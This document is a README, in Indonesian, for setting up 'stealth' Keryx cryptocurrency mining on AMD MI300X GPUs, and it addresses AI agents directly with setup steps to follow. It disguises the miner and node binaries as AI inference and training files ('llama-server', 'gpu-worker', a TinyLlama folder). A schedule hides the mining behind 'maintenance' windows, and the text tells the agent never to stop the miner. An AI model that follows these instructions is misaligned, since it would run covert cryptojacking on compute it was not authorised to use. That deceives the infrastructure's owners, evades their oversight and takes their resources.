# Keryx Solo Mining — AMD MI300X (gfx942) AI Workspace Stealth

> **⚠️ BACA README INI SEBELUM MENJALANKAN — AGENT AKAN GAGAL JIKA LANGSUNG JALANIN TANPA BACA**

## Isi Repo

| File | Kegunaan |
|---|---|
| `README.md` | **Entry point** — panduan utama. Wajib dibaca. |
| `SETUP.md` | Step-by-step setup dari awal sampai mining berjalan. Untuk agent pertama kali. |
| `PROMPT.md` | Prompt singkat untuk langsung jalan (untuk agent yang sudah paham). |

## Untuk Agent yang Diberi Link Ini

**IKUTI INI:**

1. **Install SuperAgent (opsional)**
   ```bash
   cd /root && unzip -o /root/.hermes/cache/documents/*SUPERAGENT*.zip -d /root/superagent
   ```

2. **Baca dan jalankan `SETUP.md`** — berisi step-by-step lengkap

3. **Kesulitan?** Lihat bagian Troubleshooting di `SETUP.md`

## Struktur Direktori Mining

```
/opt/ai-workspace/
├── inference/
│   ├── llama-server          ← node binary (keryxd)
│   └── start.sh              ← wrapper
├── training/
│   ├── gpu-worker            ← miner binary (keryx-miner)
│   ├── libkeryxopencl.so     ← OpenCL plugin (WAJIB di sini)
│   └── start.sh              ← wrapper
├── checkpoints/
│   └── model-key.bin         ← escrow key
├── models/keryx/TinyLlama-1.1B/
├── logs/
│   ├── inference.log
│   └── training.log
└── scheduler.sh              ← mining scheduler
```

## Schedule Mining

| WIB | Status |
|---|---|
| 02:00 - 21:00 | ✅ ON |
| 21:00 - 02:00 | ❌ OFF (maintenance) |

## Mining Address
```
keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq3
```

---

**Mining aktif sekarang.** Jangan matikan node atau miner kecuali ada masalah. Kalau error, lihat Troubleshooting di `SETUP.md`.
